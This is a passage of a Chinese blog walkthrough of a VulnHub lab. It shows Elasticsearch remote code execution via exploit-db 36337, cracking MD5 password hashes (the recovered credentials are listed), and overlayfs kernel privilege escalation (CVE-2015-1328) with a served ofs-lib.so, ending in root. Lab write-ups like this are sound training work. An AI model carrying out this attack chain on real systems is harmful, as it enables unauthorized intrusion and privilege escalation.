+<h2><span id="1721703">172.17.0.3</span></h2><p>172.17.0.3 开启的 9200 端口   服务 是  ElasticSearch  漏洞<br> 因为这个服务 以前有很多 rce 漏洞 使用msf 搜索一下 漏洞exp<br><code>searchsploit ElasticSearch</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1667489236852-12c89f75-2aee-4922-817d-4a65d885ef04.png#averageHue=%2330333d&clientId=u19d0abbf-3f3c-4&from=paste&height=246&id=u75b0a1d1&name=image.png&originHeight=246&originWidth=1291&originalType=binary&ratio=1&rotation=0&showTitle=false&size=71853&status=done&style=none&taskId=uba9f679c-f7e9-4533-8332-2c70181d452&title=&width=1291" alt="image.png"><br>就选择第一个<br><code>cd /usr/share/exploitdb/exploits/linux/remote </code> <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1667489413968-02080d27-4a7b-47fb-b271-d3e58598398a.png#averageHue=%23283a42&clientId=u19d0abbf-3f3c-4&from=paste&height=296&id=uad367509&name=image.png&originHeight=296&originWidth=912&originalType=binary&ratio=1&rotation=0&showTitle=false&size=42832&status=done&style=none&taskId=u48cd9d75-2ece-45b2-8c43-251525d698f&title=&width=912" alt="image.png"><br><code>proxychains python2 36337.py 172.17.0.3</code><br>这样就又的一台 主机 </p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1667489440611-b66b410a-acea-413c-8dad-eceb6398a806.png#averageHue=%23242934&clientId=u19d0abbf-3f3c-4&from=paste&height=370&id=u426ffe1e&name=image.png&originHeight=370&originWidth=1070&originalType=binary&ratio=1&rotation=0&showTitle=false&size=59130&status=done&style=none&taskId=u5b911279-e85c-417f-b301-6da75b67351&title=&width=1070" alt="image.png"><br>可惜 又是一台 docker  容器 <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1667489572785-828ea3d6-37bf-49e3-ab3b-445fa3af5085.png#averageHue=%23272c38&clientId=u19d0abbf-3f3c-4&from=paste&height=235&id=uf9a32a33&name=image.png&originHeight=235&originWidth=1159&originalType=binary&ratio=1&rotation=0&showTitle=false&size=84527&status=done&style=none&taskId=ua5ea786c-ce16-46e1-9474-ae11de55bbc&title=&width=1159" alt="image.png"></p>
+<p><a name="MQ8Ub"></a></p>
+<h2><span id="内网目标主机">内网目标主机</span></h2><p>那现在内网目标主机就是 172.17.0.1 了 <br>但是在刚才的容器 可以发现有一个passwords 文件 <br>查看发现是用户名 和 md5 值 <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1667489675967-833f542b-1683-4fca-b946-d8a5e8e3789d.png#averageHue=%23242631&clientId=u19d0abbf-3f3c-4&from=paste&height=580&id=u1d3109a4&name=image.png&originHeight=580&originWidth=900&originalType=binary&ratio=1&rotation=0&showTitle=false&size=73077&status=done&style=none&taskId=u1954d0d7-2eb2-42c7-a6b4-c44a978e4d5&title=&width=900" alt="image.png"><br>解密 <br>解密网站<br><a target="_blank" rel="noopener" href="https://www.t007.cn/">https://www.t007.cn/</a><br><a target="_blank" rel="noopener" href="https://www.cmd5.com/">https://www.cmd5.com/</a><br><a target="_blank" rel="noopener" href="https://www.somd5.com/">https://www.somd5.com/</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">john            1337hack<br>test 			1234test<br>admin 			<span class="hljs-number">1111</span><span class="hljs-keyword">pass</span><br>root			<span class="hljs-number">1234</span><span class="hljs-keyword">pass</span><br>jane 			1234jane<br></code></pre></td></tr></table></figure>
+
+<p><a name="gIxng"></a></p>
+<h1><span id="登录目标主机">登录目标主机</span></h1><p>使用发现的用户名密码进行ssh 登录 <br>经过测试只有 john 可以成功登录 <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1667490238612-c3b21b03-a761-4db3-ba4c-c2699e188987.png#averageHue=%23252833&clientId=u19d0abbf-3f3c-4&from=paste&height=377&id=ucaba60dc&name=image.png&originHeight=377&originWidth=651&originalType=binary&ratio=1&rotation=0&showTitle=false&size=61352&status=done&style=none&taskId=u4d59b692-6e38-4495-8874-48d7b2faa5e&title=&width=651" alt="image.png"><br>只是一个普通用户 <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1667490411043-d52efbda-dff2-49fe-8c7c-886ce972127d.png#averageHue=%23242732&clientId=u19d0abbf-3f3c-4&from=paste&height=130&id=u359ad2c8&name=image.png&originHeight=130&originWidth=621&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17884&status=done&style=none&taskId=uabb36468-fe14-4821-af3a-a9cb13c70bb&title=&width=621" alt="image.png"><br>需要进行提权处理<br><a name="rsWzC"></a></p>
+<h1><span id="内核提权">内核提权</span></h1><p><code>uname -a </code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1667490781589-fb359317-a20c-4fc7-950f-4b1f3e76021e.png#averageHue=%23252934&clientId=u19d0abbf-3f3c-4&from=paste&height=63&id=u2e136e65&name=image.png&originHeight=63&originWidth=953&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18484&status=done&style=none&taskId=u3455839a-5656-4659-a557-33fc3b60d26&title=&width=953" alt="image.png"><br>使用的 3.13  的 内核版本 <br>搜索  linux 3.13 <br><code>searchsploit linux 3.13  </code><br>选择 <br>Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04&#x2F;14.04&#x2F;14.10&#x2F;15.04) - ‘overlayfs’ Local Privilege Escalation     | linux&#x2F;local&#x2F;37292.c</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1667490958237-96335f70-bd63-4226-8dd6-0d026049bdba.png#averageHue=%23262a36&clientId=u19d0abbf-3f3c-4&from=paste&height=752&id=u9261ebf8&name=image.png&originHeight=752&originWidth=1272&originalType=binary&ratio=1&rotation=0&showTitle=false&size=381543&status=done&style=none&taskId=u1ba048d2-92c1-43b0-9c84-838e082c991&title=&width=1272" alt="image.png"></p>
+<p>通过查看源码发现</p>
+<ol>
+<li>在第<strong>139-147</strong>行，通过C代码再次执行了<strong>gcc</strong>命令，将<strong>ofs-lib.c</strong>编译为<strong>ofs-lib.so</strong>文件，所以即便在kali上事先编译好了，但是当在目标系统上运行的时候由于目标系统上并没有安装<strong>gcc</strong>还是会报错；解决的方法有很多，比较简单直接的方法是修改源码内容，将编译部分删除，然后在kali中寻找有没有现成的<strong>ofs-lib.so文件</strong></li>
+<li>第<strong>148</strong>行，读取了**&#x2F;tmp&#x2F;ofs-lib.so<strong>文件，所以在目标系统上执行的时候，需要将</strong>ofs-lib.so<strong>文件放到</strong>tmp**目录下才可以成功读取到这个文件</li>
+</ol>
+<p>修改源码文件，删除原先的第<strong>139-147</strong>行，修改后的内容如下<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1667491378491-5cc7b956-418b-49e8-9ff7-721bae68c9a0.png#averageHue=%2323252f&clientId=u19d0abbf-3f3c-4&from=paste&height=276&id=uf1e5b129&name=image.png&originHeight=276&originWidth=949&originalType=binary&ratio=1&rotation=0&showTitle=false&size=61043&status=done&style=none&taskId=ud52d6ce3-6b3b-4643-ac6f-cad38d77666&title=&width=949" alt="image.png"><br>编译修改后的C源码<br>执行命令： <code>**gcc -o exp 37292.c**</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1667491463702-a78f10bb-a086-4c16-8c54-c7ff487a7d31.png#averageHue=%23242732&clientId=u19d0abbf-3f3c-4&from=paste&height=390&id=udc725a4a&name=image.png&originHeight=390&originWidth=1209&originalType=binary&ratio=1&rotation=0&showTitle=false&size=128367&status=done&style=none&taskId=u205b4096-a8f6-4859-aba3-f4215f07360&title=&width=1209" alt="image.png"></p>
+<p>查找kali中是否有ofs-lib.so文件<br>执行命令:   <code>locate ofs-lib.so</code>   或者 <code>find / -name  ofs-lib.so</code></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1667491585544-a7983b70-e4cc-4f06-820b-a2b9b00d8e28.png#averageHue=%23262a35&clientId=u19d0abbf-3f3c-4&from=paste&height=61&id=uc58b00cf&name=image.png&originHeight=61&originWidth=655&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19134&status=done&style=none&taskId=u0b3f447b-40f6-4bba-aff7-68611a99381&title=&width=655" alt="image.png"><br>复制到当前目录 <br><code> cp /usr/share/metasploit-framework/data/exploits/CVE-2015-1328/ofs-lib.so  ./</code><br>开启 http 服务 <br><code>python3 -m http.server 80 </code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1667491749842-3e261bb8-266c-4b91-9250-9e261a64cefe.png#averageHue=%23262a35&clientId=u19d0abbf-3f3c-4&from=paste&height=54&id=uf3c9d4a7&name=image.png&originHeight=54&originWidth=526&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12684&status=done&style=none&taskId=u79c32468-2dc8-496b-9289-538d160e237&title=&width=526" alt="image.png"></p>
+<p>目标主机进入 tmp 目录下面  <br>下载下来之后执行 <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1667491849740-5cecfdd1-23bb-4c97-a09f-468cfb8a868f.png#averageHue=%23252832&clientId=u19d0abbf-3f3c-4&from=paste&height=365&id=u4137a261&name=image.png&originHeight=365&originWidth=1294&originalType=binary&ratio=1&rotation=0&showTitle=false&size=119097&status=done&style=none&taskId=u3d896a22-7d95-4a93-9e4e-38d3e3c9a43&title=&width=1294" alt="image.png"><br>赋 可执行权限 然后执行 <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1667491897374-6e2da164-b2c0-4186-8ae5-2b5bfd6f1a5f.png#averageHue=%23242731&clientId=u19d0abbf-3f3c-4&from=paste&height=171&id=uc050188c&name=image.png&originHeight=171&originWidth=774&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35781&status=done&style=none&taskId=u532eda47-158c-4802-a632-9137e8ece5a&title=&width=774" alt="image.png"><br>变成 root 权限 了</p>
+
+      </div>
+    </div>
+  </article>
+  <div class="post__foot">
+    
+    <div class="post-nav">
+  
+    <a class="post-nav-item-left" href="/2023/03/19/Sunset-dawn/">
+      <div class="text-align">
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+        <span class="text-small">上一篇</span>
+      </div>
+      <div>Sunset-dawn</div>
+    </a>
+  
+  <div class="vhr"></div>
+  
+    <a class="post-nav-item-right" href="/2023/03/19/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/">
+      <div class="text-align">
+        <span class="text-small">下一篇</span>
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             transform="scale(-1,-1)"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+      </div>
+      内存取证
+    </a>
+  
+</div>
+
+    
+      <div class="related-post">
+  <div class="related__head">
+  <a href="/tags/vulnhub/" class="post-tag">#vulnhub</a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-tag">#渗透测试</a>
+
+</div>
+  <div class="realated__body">
+    
+      DEBUG: 请安装插件 <a target="_blank" rel="noopener" href="https://github.com/tea3/hexo-related-popular-posts">hexo-related-popular-posts</a> 或关闭 related_post 配置!
+    
+  </div>
+</div>
+
+    
+    
+  </div>
+
+    </div>
+    <div class="foot">
+      <div class="foot-inner">
+        <div class="foot__head">
+          
+            <div class="foot-line">
+              
+                <div class="matts">浮</div>
+              
+                <div class="matts">云</div>
+              
+                <div class="matts">游</div>
+              
+                <div class="matts">子</div>
+              
+                <div class="matts">意</div>
+              
+            </div>
+          
+            <div class="foot-line">
+              
+                <div class="matts">落</div>
+              
+                <div class="matts">日</div>
+              
+                <div class="matts">故</div>
+              
+                <div class="matts">人</div>
+              
+                <div class="matts">情</div>
+              
+            </div>
+          
+        </div>
+        <div class="foot__body">
+          
+          
+            <div class="foot-item">
+              <div class="foot-item__head">账号</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-github.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/x0blank">github</a>
+                  </div>
+                
+              </div>
+            </div>
+          
+          <div class="foot-item">
+            <div class="foot-item__head">联系</div>
+            <div class="foot-item__body">
+              <div class="text">
+                <img alt="link" height="20px" width="20px" src="/images/icon/icon-email.svg"/>
+                <a class="foot-link" href="mailto:chenxiaolong592@gmail.com">chenxiaolong592@gmail.com</a>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="copyright">
+          <a href="http://example.com">Blanks'Blog</a> &nbsp;|&nbsp;由&nbsp;<a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>&nbsp;及&nbsp;
+          <svg width="20" height="20" viewBox="0 0 725 725">
+            <path fill-rule="evenodd" fill="rgb(221, 221, 221)" d="M145.870,236.632 L396.955,103.578 L431.292,419.44 L156.600,522.53 L145.870,236.632 Z"/>
+            <path fill-rule="evenodd" fill="rgb(159, 159, 159)" d="M396.955,103.578 L564.345,234.486 L611.558,513.469 L431.292,419.44 L396.955,103.578 Z"/>
+            <path fill-rule="evenodd" fill="rgb(0, 0, 0)" d="M431.292,419.44 L611.558,513.469 L358.327,595.18 L156.600,522.53 L431.292,419.44 Z"/>
+          </svg>
+          <a target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">致远</a>&nbsp;驱动
+        </div>
+      </div>
+    </div>
+    
+    
+  
+
+  </body>
+</html>
